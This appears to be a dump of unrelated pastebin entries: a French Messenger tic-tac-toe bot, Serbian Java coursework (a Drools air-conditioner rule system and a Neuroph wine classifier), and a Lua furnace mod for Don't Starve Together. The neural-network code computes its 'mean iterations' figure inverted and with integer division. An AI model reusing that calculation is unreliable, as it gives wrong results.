                `\n𝚄𝚗𝚎 𝚏𝚘𝚒𝚜 𝚕𝚊 𝚙𝚊𝚛𝚝𝚒𝚎 𝚕𝚊𝚗𝚌𝚎́𝚎, 𝚙𝚘𝚞𝚛 𝚏𝚊𝚒𝚛𝚎 𝚞𝚗 𝚌𝚘𝚞𝚙 : 𝚎𝚗𝚟𝚘𝚢𝚎𝚣 𝚞𝚗 𝚗𝚞𝚖𝚎́𝚛𝚘 (𝟷-𝟿) 𝚌𝚘𝚛𝚛𝚎𝚜𝚙𝚘𝚗𝚍𝚊𝚗𝚝 à 𝚕𝚊 𝚌𝚊𝚜𝚎 𝚜𝚘𝚞𝚑𝚊𝚒𝚝𝚎́𝚎.\n` +
                `\n𝙿𝚘𝚞𝚛 𝚙𝚕𝚞𝚜 𝚍'𝚊𝚒𝚍𝚎 : \`𝚝𝚒𝚌𝚝𝚊𝚌𝚝𝚘𝚎 𝚑𝚎𝚕𝚙\`\n` +
                `𝙿𝚘𝚞𝚛 𝚟𝚘𝚒𝚛 𝚟𝚘𝚜 𝚜𝚝𝚊𝚝𝚒𝚜𝚝𝚒𝚚𝚞𝚎𝚜 : \`𝚝𝚒𝚌𝚝𝚊𝚌𝚝𝚘𝚎 𝚜𝚝𝚊𝚝𝚜\`\n` +
                `𝙿𝚘𝚞𝚛 𝚊𝚋𝚊𝚗𝚍𝚘𝚗𝚗𝚎𝚛 𝚞𝚗𝚎 𝚙𝚊𝚛𝚝𝚒𝚎 : \`𝚏𝚘𝚛𝚏𝚊𝚒𝚝\`\n` +
                `𝙿𝚘𝚞𝚛 𝚛𝚎𝚕𝚊𝚗𝚌𝚎𝚛 𝚞𝚗𝚎 𝚙𝚊𝚛𝚝𝚒𝚎 𝚝𝚎𝚛𝚖𝚒𝚗𝚎́𝚎 : \`𝚛𝚎𝚜𝚝𝚊𝚛𝚝\`\n` +
                `\n𝙿𝙾𝚄𝚁 𝙻𝙴 𝚃𝙾𝚄𝚁𝙽𝙾𝙸 :\n` +
                `  •  𝙻𝚊𝚗𝚌𝚎𝚛 𝚞𝚗 𝚝𝚘𝚞𝚛𝚗𝚘𝚒 : \`𝚝𝚝𝚝 𝚝𝚘𝚞𝚛𝚗𝚘𝚒\`\n` +
                `  •  𝚁𝚎𝚓𝚘𝚒𝚗𝚍𝚛𝚎 𝚕𝚎 𝚝𝚘𝚞𝚛𝚗𝚘𝚒 : \`𝚓𝚘𝚒𝚗\` (𝚗'𝚒𝚖𝚙𝚘𝚛𝚝𝚎 𝚘𝚞̀ 𝚍𝚊𝚗𝚜 𝚕𝚎 𝚌𝚑𝚊𝚝)\n` +
                `  •  𝚀𝚞𝚒𝚝𝚝𝚎𝚛 𝚕𝚎 𝚝𝚘𝚞𝚛𝚗𝚘𝚒 : \`𝚘𝚞𝚝\` (𝚗'𝚒𝚖𝚙𝚘𝚛𝚝𝚎 𝚘𝚞̀ 𝚍𝚊𝚗𝚜 𝚕𝚎 𝚌𝚑𝚊𝚝)\n` +
                `\n━━━━━━━━❪❐❫━━━━━━━━\n` +
                `𝙰𝚖𝚞𝚜𝚎𝚣-𝚟𝚘𝚞𝚜 𝚋𝚒𝚎𝚗 ! 🎲`,
                threadID,
                event.messageID
            );
        }

        if (command === ""stats"") {
            const stats = playerStats[senderID];
            if (stats) {
                return api.sendMessage(
                    `📊| 𝚅𝚘𝚜 𝚜𝚝𝚊𝚝𝚒𝚜𝚝𝚒𝚚𝚞𝚎𝚜 𝚍𝚎 𝚃𝚒𝚌-𝚃𝚊𝚌-𝚃𝚘𝚎 :\n` +
                    `  •  𝚅𝚒𝚌𝚝𝚘𝚒𝚛𝚎𝚜 : ${stats.wins}\n` +
                    `  •  𝙳𝚎́𝚏𝚊𝚒𝚝𝚎𝚜 : ${stats.losses}\n` +
                    `━━━━━━━━❪❐❫━━━━━━━━`,
                    threadID,
                    event.messageID
                );
            } else {
                return api.sendMessage(
                    `📊| 𝚅𝚘𝚞𝚜 𝚗'𝚊𝚟𝚎𝚣 𝚙𝚊𝚜 𝚎𝚗𝚌𝚘𝚛𝚎 𝚓𝚘𝚞𝚎́ 𝚍𝚎 𝚙𝚊𝚛𝚝𝚒𝚎𝚜 𝚍𝚎 𝚃𝚒𝚌-𝚃𝚊𝚌-𝚃𝚘𝚎. 𝙻𝚊𝚗𝚌𝚎𝚣-𝚟𝚘𝚞𝚜 !`,
                    threadID,
                    event.messageID
                );
            }
        }

        if (mentionedIDs.length > 0) {
            opponentID = mentionedIDs[0];
        } else if (args[0]) {
            if (!/^\d+$/.test(args[0])) {
                return api.sendMessage(""𝙸𝙳 𝚒𝚗𝚟𝚊𝚕𝚒𝚍𝚎. 𝙼𝚎𝚛𝚌𝚒 𝚍𝚎 𝚏𝚘𝚞𝚛𝚗𝚒𝚛 𝚞𝚗 𝙸𝙳 𝚗𝚞𝚖𝚎́𝚛𝚒𝚚𝚞𝚎."", threadID, event.messageID);
            }
            opponentID = args[0];
        }

        if (!opponentID) {
            return api.sendMessage(""❌| 𝙿𝚘𝚞𝚛 𝚌𝚘𝚖𝚖𝚎𝚗𝚌𝚎𝚛 𝚞𝚗𝚎 𝚙𝚊𝚛𝚝𝚒𝚎, 𝚖𝚎𝚗𝚝𝚒𝚘𝚗𝚗𝚎𝚣 𝚞𝚗 𝚊𝚖𝚒 𝚘𝚞 𝚍𝚘𝚗𝚗𝚎𝚣 𝚜𝚘𝚗 𝙸𝙳. 𝙿𝚘𝚞𝚛 𝚍𝚎 𝚕'𝚊𝚒𝚍𝚎, 𝚝𝚊𝚙𝚎𝚣 `𝚝𝚒𝚌𝚝𝚊𝚌𝚝𝚘𝚎 𝚑𝚎𝚕𝚙`."", threadID, event.messageID);
        }
        if (opponentID == senderID) {
            return api.sendMessage(""𝚅𝚘𝚞𝚜 𝚗𝚎 𝚙𝚘𝚞𝚟𝚎𝚣 𝚙𝚊𝚜 𝚓𝚘𝚞𝚎𝚛 𝚌𝚘𝚗𝚝𝚛𝚎 𝚟𝚘𝚞-𝚖𝚎̂𝚖𝚎 !"", threadID, event.messageID);
        }

        const gameID = `${threadID}:${Math.min(senderID, opponentID)}:${Math.max(senderID, opponentID)}`;

        if (games[gameID] && games[gameID].inProgress) {
            return api.sendMessage(""❌| 𝚄𝚗 𝚓𝚎𝚞 𝚎𝚜𝚝 𝚍𝚎́𝚓𝚊̀ 𝚎𝚗 𝚌𝚘𝚞𝚛𝚜 𝚎𝚗𝚝𝚛𝚎 𝚌𝚎𝚜 𝚓𝚘𝚞𝚎𝚞𝚛𝚜. 𝚅𝚎𝚞𝚒𝚕𝚕𝚎𝚣 𝚙𝚊𝚝𝚒𝚎𝚗𝚝𝚎𝚛 ⏳."", threadID, event.messageID);
        }

        const player1Info = await api.getUserInfo(senderID);
        const player2Info = await api.getUserInfo(opponentID);

        if (!player2Info[opponentID]) {
            return api.sendMessage(""𝙸𝚖𝚙𝚘𝚜𝚜𝚒𝚋𝚕𝚎 𝚍𝚎 𝚝𝚛𝚘𝚞𝚟𝚎𝚛 𝚕'𝚞𝚝𝚒𝚕𝚒𝚜𝚊𝚝𝚎𝚞𝚛 𝚊𝚟𝚎𝚌 𝚌𝚎𝚝 𝙸𝙳."", threadID, event.messageID);
        }

        const player1 = { id: senderID, name: player1Info[senderID].name, threadID: threadID };
        const player2 = { id: opponentID, name: player2Info[opponentID].name, threadID: threadID };

        resetGame(gameID, player1, player2);

        api.sendMessage(
            `🎮| 𝙿𝚊𝚛𝚝𝚒𝚎 𝚍𝚎 𝚃𝚒𝚌-𝚃𝚊𝚌-𝚃𝚘𝚎 𝚎𝚗𝚝𝚛𝚎 ${player1.name} 『❌』 𝚎𝚝 ${player2.name} 『⭕』 𝚌𝚘𝚖𝚖𝚎𝚗𝚌𝚎 !\n${displayBoard(games[gameID].board)}\n\n${player1.name}, 𝚏𝚊𝚒𝚝𝚎𝚜 𝚟𝚘𝚝𝚛𝚎 𝚙𝚛𝚎𝚖𝚒𝚎𝚛 𝚖𝚘𝚞𝚟𝚎𝚖𝚎𝚗𝚝 𝚎𝚗 𝚎𝚗𝚟𝚘𝚢𝚊𝚗𝚝 𝚞𝚗 𝚗𝚞𝚖𝚎́𝚛𝚘 (𝟷-𝟿).`,
            threadID,
            event.messageID
        );
    },

    onChat: async function ({ api, event }) {
        const threadID = event.threadID;
        const senderID = event.senderID;
        const messageBody = event.body.trim().toLowerCase();
        const senderInfo = await api.getUserInfo(senderID);
        const senderName = senderInfo[senderID].name;
        const currentTournament = tournaments[threadID];

        if (currentTournament && currentTournament.status === 'registration') {
            if (messageBody === ""join"") {
                const existingPlayer = currentTournament.players.find(p => p.id === senderID);
                if (existingPlayer) {
                    return api.sendMessage(`🧐| ${senderName}, 𝚟𝚘𝚞 𝚎̂𝚝𝚎𝚜 𝚍𝚎́𝚓𝚊̀ 𝚒𝚗𝚜𝚌𝚛𝚒𝚝 𝚊𝚞 𝚝𝚘𝚞𝚛𝚗𝚘𝚒 !`, threadID, event.messageID);
                }
                if (currentTournament.players.length >= 8) {
                    return api.sendMessage(`🚫| 𝙻𝚎 𝚝𝚘𝚞𝚛𝚗𝚘𝚒 𝚎𝚜𝚝 𝚌𝚘𝚖𝚙𝚕𝚎𝚝 (${currentTournament.players.length}/8). 𝚅𝚎𝚞𝚒𝚕𝚕𝚎𝚣 𝚊𝚝𝚝𝚎𝚗𝚍𝚛𝚎 𝚕𝚎 𝚙𝚛𝚘𝚌𝚑𝚊𝚒𝚗 𝚝𝚘𝚞𝚛𝚗𝚘𝚒 !`, threadID, event.messageID);
                }

                currentTournament.players.push({ id: senderID, name: senderName, avatarURL: senderInfo[senderID].profileUrl });
                const updatedBracketVisual = await generateTournamentBracketVisual(currentTournament);

                await api.sendMessage(
                    `✅| ${senderName} 𝚊 𝚛𝚎𝚓o𝚒𝚗𝚝 𝚕𝚎 𝚝𝚘𝚞𝚛𝚗𝚘𝚒 ! ${currentTournament.players.length}/8 𝚓𝚘𝚞𝚎𝚞𝚛𝚜.\n` +
                    `${updatedBracketVisual}\n` +
                    (currentTournament.players.length < 8 ? `𝙴𝚗𝚌𝚘𝚛𝚎 ${8 - currentTournament.players.length} 𝚙𝚕𝚊𝚌𝚎(𝚜) !` : `𝙻𝚎 𝚝𝚘𝚞𝚛𝚗𝚘𝚒 𝚎𝚜𝚝 𝚙𝚛𝚎̂𝚝 !`),
                    threadID,
                    event.messageID
                );
                
                // Si votre API supporte l'édition de messages avec des images,
                // c'est ici que vous tenteriez d'éditer le message initial du bracket
                // au lieu d'en envoyer un nouveau.
                // Exemple (à adapter si votre API a une fonction d'édition de message):
                // if (currentTournament.messageID && yourApi.editMessage) {
                //    const imageBuffer = await generateTournamentBracketImage(currentTournament);
                //    await yourApi.editMessage({ attachment: imageBuffer }, currentTournament.messageID);
                // }


                if (currentTournament.players.length === 8) {
                    currentTournament.status = 'in_progress';

                    await api.sendMessage(
                        `🎉| 𝙻𝚎 𝚝𝚘𝚞𝚛𝚗𝚘𝚒 𝚎𝚜𝚝 𝚌𝚘𝚖𝚙𝚕𝚎𝚝 ! 𝙻𝚎𝚜 𝚖𝚊𝚝𝚌𝚑𝚜 𝚟𝚘𝚗𝚝 𝚌𝚘𝚖𝚖𝚎𝚗𝚌𝚎𝚛 𝚋𝚒𝚎𝚗𝚝𝚘̂𝚝 !`,
                        threadID
                    );
                    // TODO: Ajoutez ici le code pour lancer le premier tour du tournoi.
                    // Par exemple: startTournamentRounds(currentTournament, api, threadID);
                }
                return;
            }

            if (messageBody === ""out"") {
                const playerIndex = currentTournament.players.findIndex(p => p.id === senderID);
                if (playerIndex === -1) {
                    return api.sendMessage(`🧐| ${senderName}, 𝚟𝚘𝚞 𝚗'𝚎̂𝚝𝚎𝚜 𝚙𝚊𝚜 𝚒𝚗𝚜𝚌𝚛𝚒𝚝 𝚊𝚞 𝚝𝚘𝚞𝚛𝚗𝚘𝚒.`, threadID, event.messageID);
                }

                currentTournament.players.splice(playerIndex, 1);
                const updatedBracketVisual = await generateTournamentBracketVisual(currentTournament);
                await api.sendMessage(
                    `🗑️| ${senderName} 𝚊 𝚚𝚞𝚒𝚝𝚝𝚎́ 𝚕𝚎 𝚝𝚘𝚞𝚛𝚗𝚘𝚒. ${currentTournament.players.length}/8 𝚓𝚘𝚞𝚎𝚞𝚛𝚜.\n` +
                    `${updatedBracketVisual}`, // Affiche la mise à jour
                    threadID,
                    event.messageID
                );
                return;
            }
        }

        const gameID = Object.keys(games).find((id) =>
            games[id].threadID === threadID &&
            games[id].players.some(player => player.id === senderID)
        );

        if (!gameID) return;

        const game = games[gameID];
        if (!game.inProgress) {
            if (messageBody === ""restart"") {
                const player1 = game.players[0];
                const player2 = game.players[1];
                resetGame(gameID, player1, player2);
                return api.sendMessage(
                    `🎮| 𝙽𝚘𝚞𝚟𝚎𝚊𝚞 𝚓𝚎𝚞 𝚍𝚎 𝚃𝚒𝚌-𝚃𝚊𝚌-𝚃𝚘𝚎 𝚎𝚗𝚝𝚛𝚎 ${player1.name} 『❌』 𝚎𝚝 ${player2.name} 『⭕』 !\n${displayBoard(game.board)}\n\n${player1.name}, 𝚟𝚘𝚞𝚜 𝚌𝚘𝚖𝚖𝚎𝚗𝚌𝚎𝚣 𝚎𝚗 𝚙𝚛𝚎𝚖𝚒𝚎𝚛, 𝚌𝚑𝚘𝚒𝚜𝚒𝚜𝚜𝚎𝚣 𝚞𝚗𝚎 𝚌𝚊𝚜𝚎.`,
                    threadID,
                    event.messageID
                );
            }
            return;
        }

        if (messageBody === ""forfait"") {
            const forfeitingPlayer = game.players.find(player => player.id === senderID);
            const opponentPlayer = game.players.find(player => player.id !== senderID);

            game.inProgress = false;
            if (!playerStats[forfeitingPlayer.id]) playerStats[forfeitingPlayer.id] = { wins: 0, losses: 0 };
            playerStats[forfeitingPlayer.id].losses++;
            if (!playerStats[opponentPlayer.id]) playerStats[opponentPlayer.id] = { wins: 0, losses: 0 };
            playerStats[opponentPlayer.id].wins++;

            return api.sendMessage(
                `🏳️| ${forfeitingPlayer.name} 𝚊 𝚊𝚋𝚊𝚗𝚍𝚘𝚗𝚗𝚎́ 𝚕𝚊 𝚙𝚊𝚛𝚝𝚒𝚎. ${opponentPlayer.name} 𝚎𝚜𝚝 𝚍𝚎́𝚌𝚕𝚊𝚛𝚎́ 𝚟𝚊𝚒𝚗𝚚𝚞𝚎𝚞𝚛 ! 𝚃𝚊𝚙𝚎𝚣 ""𝚛𝚎𝚜𝚝𝚊𝚛𝚝"" 𝚙𝚘𝚞𝚛 𝚛𝚎𝚌𝚘𝚖𝚖𝚎𝚗𝚌𝚎𝚛.`,
                threadID,
                event.messageID
            );
        }

        const position = parseInt(messageBody) - 1;
        const currentPlayer = game.players[game.currentPlayerIndex];

        if (senderID !== currentPlayer.id) {
            if (isNaN(position) || position < 0 || position > 8 || game.board[position] !== null) {
                return;
            }
            return api.sendMessage(`𝙲𝚎 𝚗'𝚎𝚜𝚝 𝚙𝚊𝚜 𝚟𝚘𝚝𝚛𝚎 𝚝𝚘𝚞𝚛 ${game.players.find(p => p.id === senderID).name} ! 𝙲'𝚎𝚜𝚝 𝚕𝚎 𝚝𝚘𝚞𝚛 𝚍𝚎 ${currentPlayer.name}.`, threadID, event.messageID);
        }

        if (isNaN(position) || position < 0 || position > 8 || game.board[position] !== null) {
            return api.sendMessage(`${currentPlayer.name}, 𝚌𝚊𝚜𝚎 𝚒𝚗𝚟𝚊𝚕𝚒𝚍𝚎 𝚘𝚞 𝚍𝚎́𝚓𝚊̀ 𝚘𝚌𝚌𝚞𝚙𝚎́𝚎. 𝙲'𝚎𝚜𝚝 𝚝𝚘𝚞𝚓𝚘𝚞𝚛𝚜 à 𝚟𝚘𝚝𝚛𝚎 𝚝𝚘𝚞𝚛 !`, threadID, event.messageID);
        }

        game.board[position] = currentPlayer.symbol;

        if (checkWinner(game.board) || isBoardFull(game.board)) {
            await handleGameEnd(gameID, api, event);
            return;
        }

        game.currentPlayerIndex = (game.currentPlayerIndex + 1) % 2;
        const nextPlayer = game.players[game.currentPlayerIndex];
        api.sendMessage(
            `${displayBoard(game.board)}\n\n${nextPlayer.name}, 𝚌'𝚎𝚜𝚝 à 𝚟𝚘𝚝𝚛𝚎 𝚝𝚘𝚞𝚛 !`,
            threadID,
            event.messageID
        );
    }
};"
PM3GgUEd,IS ES Kod,AleksaLjujic,Java,Saturday 26th of July 2025 12:27:35 AM CDT,"//Drools file

package com.sample;

import org.kie.api.KieServices;
import org.kie.api.runtime.KieContainer;
import org.kie.api.runtime.KieSession;

/**
 * This is a sample class to launch a rule.
 */
public class DroolsTest {

    public static final void main(String[] args) {
        try {
            // load up the knowledge base
	        KieServices ks = KieServices.Factory.get();
    	    KieContainer kContainer = ks.getKieClasspathContainer();
        	KieSession kSession = kContainer.newKieSession(""ksession-rules"");

            // Kreiranje novog objekta i unos cinjenica
        	KlimaUredjaj k = new KlimaUredjaj();
        	k.setKvadratura(62);
        	k.setBrojProstorija(""vise"");
        	k.setRadNaNiskimTemperaturama(true);
            k.setMogucaUgradnjaNaZid(false);
        	
        	//Unosenje objekta u ES
            kSession.insert(k);
            
            //Pokretanje ES
            kSession.fireAllRules();
            
            //Ispis resenja
            System.out.println(k);
        } catch (Throwable t) {
            t.printStackTrace();
        }
    }

}

_________________________________________________________________________________________________________________________

//Klasa koja se pravi u skladu sa zadatkom

package com.sample;

public class KlimaUredjaj {
	
	//Pravila 9 i 10 navode da je preporuceni tip ""zidna"" klima, osim u 
	//nekim slucajevima pa se to postavlja za pocetnu vrednost atributa tip
	private String tip = ""zidna"";
	private int snaga;
	private boolean imaInverter;
	
	private int kvadratura;
	private String brojProstorija;
	private boolean mogucaUgradnjaNaZid;
	private boolean podjednakoZaGrejanje;
	private boolean radNaNiskimTemperaturama;
	
	public String getTip() {
		return tip;
	}
	
	public void setTip(String tip) {
		this.tip = tip;
	}
	
	public int getSnaga() {
		return snaga;
	}
	
	public void setSnaga(int snaga) {
		this.snaga = snaga;
	}
	
	public boolean isImaInverter() {
		return imaInverter;
	}
	
	public void setImaInverter(boolean imaInverter) {
		this.imaInverter = imaInverter;
	}
	
	public int getKvadratura() {
		return kvadratura;
	}
	
	public void setKvadratura(int kvadratura) {
		this.kvadratura = kvadratura;
	}
	
	public String getBrojProstorija() {
		return brojProstorija;
	}
	
	public void setBrojProstorija(String brojProstorija) {
		this.brojProstorija = brojProstorija;
	}
	
	public boolean isMogucaUgradnjaNaZid() {
		return mogucaUgradnjaNaZid;
	}
	
	public void setMogucaUgradnjaNaZid(boolean mogucaUgradnjaNaZid) {
		this.mogucaUgradnjaNaZid = mogucaUgradnjaNaZid;
	}
	
	public boolean isPodjednakoZaGrejanje() {
		return podjednakoZaGrejanje;
	}
	
	public void setPodjednakoZaGrejanje(boolean podjednakoZaGrejanje) {
		this.podjednakoZaGrejanje = podjednakoZaGrejanje;
	}
	
	public boolean isRadNaNiskimTemperaturama() {
		return radNaNiskimTemperaturama;
	}
	
	public void setRadNaNiskimTemperaturama(boolean radNaNiskimTemperaturama) {
		this.radNaNiskimTemperaturama = radNaNiskimTemperaturama;
	}

	//Trazi se samo ispis resenja a ne i ulaznih cinjenica, tako da toString vraca
	//tip, snagu i da li ima inverter
	@Override
	public String toString() {
		return ""KlimaUredjaj [tip="" + tip + "", snaga="" + snaga + "", imaInverter="" + imaInverter + ""]"";
	}
	
	

}

__________________________________________________________________________________________________________\

//RULES

package com.sample
 
import com.sample.KlimaUredjaj;
 
rule ""Pravilo 4""
    when
        k : KlimaUredjaj( kvadratura <= 50 && brojProstorija == ""jedna"" && snaga == 0 )
    then
    	k.setSnaga(9000);
        update( k );
end

rule ""Pravilo 5""
    when
        k : KlimaUredjaj( kvadratura <= 50 && brojProstorija == ""vise"" && snaga == 0 )
    then
    	k.setSnaga(12000);
        update( k );
end

rule ""Pravilo 6""
    when
        k : KlimaUredjaj( kvadratura > 50 && kvadratura < 75 && brojProstorija == ""jedna"" && snaga == 0 )
    then
    	k.setSnaga(12000);
        update( k );
end

rule ""Pravilo 7""
    when
        k : KlimaUredjaj( kvadratura > 50 && kvadratura < 75 && brojProstorija == ""vise"" && snaga == 0 )
    then
    	k.setSnaga(18000);
        update( k );
end

rule ""Pravilo 8""
    when
        k : KlimaUredjaj( kvadratura >= 75 && snaga == 0 )
    then
    	k.setSnaga(18000);
        update( k );
end

rule ""Pravilo 9""
    when
        k : KlimaUredjaj( brojProstorija == ""vise"" && mogucaUgradnjaNaZid == false && tip == ""zidna"" )
    then
    	k.setTip(""pokretna"");
        update( k );
end

rule ""Pravilo 10""
    when
        k : KlimaUredjaj( brojProstorija == ""jedna"" && mogucaUgradnjaNaZid == false && tip == ""zidna"" )
    then
    	k.setTip(""prozorska"");
        update( k );
end

rule ""Pravilo 11""
    when
        k : KlimaUredjaj( podjednakoZaGrejanje == true && imaInverter == false )
    then
    	k.setImaInverter(true);
        update( k );
end

rule ""Pravilo 12""
    when
        k : KlimaUredjaj( radNaNiskimTemperaturama == true && imaInverter == false )
    then
    	k.setImaInverter(true);
        update( k );
end"
YfsnNPHM,IS NN Kod,AleksaLjujic,Java,Saturday 26th of July 2025 12:24:17 AM CDT," * GLAVNI NN KOD
 */
public class NNVezba implements LearningEventListener{
    int inputCount = 13;
    int outputCount = 3;
    double[] lr = {0.2, 0.4, 0.6};
    ArrayList<Training> trainings = new ArrayList<>();
    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {
        // TODO code application logic here
        
        (new NNVezba()).run();
    }

    @Override
    public void handleLearningEvent(LearningEvent event) {
        BackPropagation bp = (BackPropagation) event.getSource();
        System.out.println(""iteration: "" +bp.getCurrentIteration()+"" ""
                           + ""Total network error: "" +bp.getTotalNetworkError());
    }

    private void run() {
        String filePath = ""wines.csv"";
        DataSet dataSet = DataSet.createFromFile(filePath, inputCount, outputCount, "","");
        
        Normalizer norm = new MaxNormalizer(dataSet);
        norm.normalize(dataSet);
        dataSet.shuffle();
        
        DataSet[] trainTest = dataSet.split(0.7, 0.3);
        DataSet trainSet = trainTest[0];
        DataSet testSet = trainTest[1];
        
        int numOfIterations = 0;
        int numOfTrainings = 0;
        
        for (double l : lr) {
            MultiLayerPerceptron nn = new MultiLayerPerceptron(inputCount, 22, outputCount);
            
            BackPropagation learningRule = nn.getLearningRule();
            
            learningRule.addListener(this);
            
            learningRule.setMaxError(0.02);
            learningRule.setLearningRate(l);
            learningRule.setMaxIterations(1000);
            
            nn.learn(trainSet);
                    
            numOfTrainings++;
            numOfIterations += learningRule.getCurrentIteration();
            
            double accuracy = evaluateAccuracy(nn, testSet);
            Training t = new Training(nn, accuracy);
            trainings.add(t);
        }
        System.out.println(""Srednja vrednosti broja iteracija :"" +numOfTrainings/numOfIterations);
        SaveNetWithMaxAccuracy();
        
    }

    private double evaluateAccuracy(MultiLayerPerceptron nn, DataSet testSet) {
        ConfMatrix cmatrix = new ConfMatrix(outputCount);
        double accuracy = 0;
        
        for (DataSetRow dataSetRow : testSet) {
            nn.setInput(dataSetRow.getInput());
            nn.calculate();
            
            int actual = getMaxIndex(dataSetRow.getDesiredOutput());
            int predicted = getMaxIndex(nn.getOutput());
            
            cmatrix.incrementElement(actual, predicted);
                
        }
        
        for (int i = 0; i < outputCount; i++) {
            accuracy += (double) (cmatrix.getTruePositive(i) + cmatrix.getTrueNegative(i)) / cmatrix.total;
        }
        
        cmatrix.print();
        
        System.out.println(""accuracy : ""+(double) accuracy/outputCount);
        
        return (double) accuracy / outputCount;
    }

    private void SaveNetWithMaxAccuracy() {
        Training maxTr = trainings.get(0);
        for (Training t : trainings) {
            if(t.getAccuracy() > maxTr.getAccuracy()){
                 maxTr = t;
            }  
        }
        maxTr.getNn().save(""nn.nnet"");
    }

    private int getMaxIndex(double[] output) {
        int maxIndex = 0;
        
        for (int i = 0; i < output.length; i++) {
            if(output[maxIndex] < output[i]){
                maxIndex = i;
            }
        }
        
        return maxIndex;
   }
    
}

________________________________________________________________________________________________________________

/**
 *
 * Training klasa
 */
    
package nn.vezba;

import org.neuroph.core.NeuralNetwork;

public class Training {
    private NeuralNetwork nn;
    private double accuracy; 

    public Training(NeuralNetwork nn, double accuracy) {
        this.nn = nn;
        this.accuracy = accuracy;
    }

    public double getAccuracy() {
        return accuracy;
    }

    public void setAccuracy(double accuracy) {
        this.accuracy = accuracy;
    }

    public NeuralNetwork getNn() {
        return nn;
    }

    public void setNn(NeuralNetwork nn) {
        this.nn = nn;
    }
    
}

________________________________________________________________________________________________________________

/**
 *
 * ConfMatrix klasa  (vecinom se kopira iz ConfusionMatrix klase)
 */

public class ConfMatrix {
    int[][] matrix;    
    int classCount;
    int total = 0;

    public ConfMatrix(int classCount) {
        this.matrix = new int[classCount][classCount];
        this.classCount = classCount;
    }
    
    public void incrementElement(int actual, int predicted) {
        matrix[actual][predicted]++;
        total++;
    }
    
     public int getTruePositive(int cl) {
        return (int)matrix[cl][cl];
    }
    
    public int getTrueNegative(int cl) {
        int trueNegative = 0;
        
        for(int i = 0; i < classCount; i++) {
            if (i == cl) continue; 
            for(int j = 0; j < classCount; j++) {
                if (j == cl) continue; 
                trueNegative += matrix[i][j];
            }
        }
        
        return trueNegative;
    }    

    public int getFalsePositive(int cl) {
        int falsePositive = 0;
        
        for(int i=0; i<classCount; i++) {
            if (i == cl) continue; 
            falsePositive += matrix[i][cl];
        }
        
        return falsePositive;
    }

    public int getFalseNegative(int cl) {
        int falseNegative = 0;
        
        for(int i=0; i<classCount; i++) {
            if (i == cl) continue; 
            falseNegative += matrix[cl][i];
        }
        
        return falseNegative;
    }
    public void print(){
        for (int i = 0; i < matrix.length; i++) {  
            for (int j = 0; j < matrix.length; j++) {
                System.out.print(matrix[i][j] + "" "");
            }
            System.out.println();
        }
    }
}"
8ZJMEuRs,portable_dragonfly_furnace,mioOOOOO,Lua,Friday 25th of July 2025 11:13:36 PM CDT,"local function onworkfinished(inst)
    if inst.components.lootdropper then
     inst.components.lootdropper:DropLoot()
    end
    local fx = SpawnPrefab(""collapse_big"")
    fx.Transform:SetPosition(inst.Transform:GetWorldPosition())
    fx:SetMaterial(""metal"")
    inst:Remove()
end

local function onworked(inst)
    if inst._task2 ~= nil then
        inst._task2:Cancel()
        inst._task2 = nil

		if not inst:IsAsleep() then
			inst.SoundEmitter:PlaySound(""dontstarve/common/together/dragonfly_furnace/fire_LP"", ""loop"")
		end

        if inst._task1 ~= nil then
            inst._task1:Cancel()
            inst._task1 = nil
        end
    end
    --inst.AnimState:PlayAnimation(""hi_hit"")
    --inst.AnimState:PushAnimation(""hi"")

    if inst.components.container ~= nil then
        inst.components.container:DropEverything()
        inst.components.container:Close()
    end
end
local function _CanBeOpened(inst)
    inst.components.container.canbeopened = true
end

local function OnIncinerateItems(inst)
    --inst.AnimState:PlayAnimation(""incinerate"")
    --inst.AnimState:PushAnimation(""hi"", true)

    inst.SoundEmitter:PlaySound(""qol1/dragonfly_furnace/incinerate"")

    inst.components.container:Close()
    inst.components.container.canbeopened = false

    local time = inst.AnimState:GetCurrentAnimationLength() - inst.AnimState:GetCurrentAnimationTime() + FRAMES

    inst:DoTaskInTime(time, _CanBeOpened)
end

local function ShouldIncinerateItem(inst, item)
    local incinerate = true

    print(""[🔥检查摧毁] 当前物品:"", item.prefab or tostring(item))

    -- 打印所有标签
    --[[
    if item.tags then
        print(""[标签] "" .. item.prefab .. "":"")
        for tag, _ in pairs(item.tags) do
            print(""  - "" .. tag)
        end
    else
        print(""[标签] 无标签"")
    end
    ]]
    if item:HasTag(""epicloot"") then
        --print(""[✅] "" .. item.prefab .. "" 有 epicloot 标签，跳过焚烧"")
        incinerate = false
    elseif item:HasTag(""irreplaceable"") then
        --print(""[✅] "" .. item.prefab .. "" 是不可替代物品，跳过焚烧"")
        incinerate = false
    elseif item.components.container ~= nil and not item.components.container:IsEmpty() then
        --print(""[✅] "" .. item.prefab .. "" 是容器且不为空，跳过焚烧"")
        incinerate = false
    else
        --print(""[⚠️] "" .. item.prefab .. "" 会被焚烧！"")
    end

    return incinerate
end

-- 便携火炉
AddPrefabPostInit('portable_dragonfly_furnace',function (inst)

    inst.entity:AddSoundEmitter()

    --cooker (from cooker component) added to pristine state for optimization
    inst:AddTag(""cooker"")

    --HASHEATER (from heater component) added to pristine state for optimization
    inst:AddTag(""HASHEATER"")

    if not TheWorld.ismastersim then
        return inst
    end

    if inst.components.edible then
        inst:RemoveComponent(""edible"")
    end
    if inst.components.stackable then
        inst:RemoveComponent(""stackable"")
    end

    ----------------------------------
    if inst.components.workable == nil then
        inst:AddComponent(""workable"")
        inst.components.workable:SetWorkAction(ACTIONS.HAMMER)
        inst.components.workable:SetWorkLeft(6)
        inst.components.workable:SetOnFinishCallback(onworkfinished)
        inst.components.workable:SetOnWorkCallback(onworked)
    end
    if inst.components.lootdropper == nil then
        inst:AddComponent(""lootdropper"")
        inst.components.lootdropper:SetLoot({ ""redgem"", ""charcoal"", ""dragon_scales"" })
        inst.components.lootdropper:AddChanceLoot(""dragon_scales"", .01)
        inst.components.lootdropper:AddChanceLoot(""ash"", .5)
        inst.components.lootdropper:AddChanceLoot(""ash"", .1)
    end

    ----------------------------------
    if inst.components.cooker == nil then
        inst:AddComponent(""cooker"")
        --inst:AddTag(""cooker"")
    end

    if inst.components.heater == nil then
        inst:AddComponent(""heater"")
        --inst:AddTag(""HASHEATER"")
		inst.components.heater.carriedheat = 70
        inst.components.heater.heat = 90
        --inst.components.heater:SetThermics(true, false)
    end

    -----------------------
    inst:AddComponent(""container"")
    inst.components.container:WidgetSetup(""dragonflyfurnace"")

    -----------------------
    inst:AddComponent(""incinerator"")
    inst.components.incinerator:SetOnIncinerateFn(OnIncinerateItems)
